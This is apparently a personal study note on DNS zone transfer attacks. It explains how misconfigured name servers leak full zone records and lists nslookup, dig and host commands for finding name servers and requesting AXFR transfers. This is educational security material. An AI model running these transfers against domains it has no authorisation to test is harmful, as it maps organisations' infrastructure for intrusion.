### General Notes

A type of attack that relies on misconfiguration of [[Domain Name System (DNS)]] servers.

---

### Methodology

These are how secondary DNS servers recieve information from the primary DNS server, as well as any updates. Zone transfers copy a domain's database from primary server or secondary server to any unauthenticated other server/[[IP]] address.

> Using a master-slave architecture.
> The master DNS is sometimes misconfigured, but it should be configured to allow for zone transfers with restrictions.

> If an attacker can perform a zone transfer with the primary or secondary name servers for a domain, the attack can view all of the DNS records for that domain.

This [tool](https://hackertarget.com/zone-transfer/) gets DNS records of a target domain by testing using zone transfers.

To start the attack, we need to know the [[IP]] address of the DNS servers. Then, we can start to request for the domain of our choice from that server the copy of the zone transfer file, which has the record we need.

###### Identifying Name Servers and Primary Server

* Using `nslookup` to get the name servers, then the primary server using `type=soa`
```
nslookup -type=NS <domain>
```
* Using `dig`
```
dig ns <domain>
dig soa <domain>
```
* Using `host`
```
host -t ns <domain>
```

> After getting the address of the primary server, we can then use that to launch the zone transfer and obtain all the data.

###### Zone Transfer Attack

* Using `nslookup`
```
nslookup -query=axfr <domain> <server-ip>
```
> We can add `-type=<>` to output only certain DNS records after performing the zone transfer.

* Using `dig`
```
dig axfr <domain> @<server-ip> 
```
* Using `host`
```
host -t axfr <domain> <server-ip>
```

---
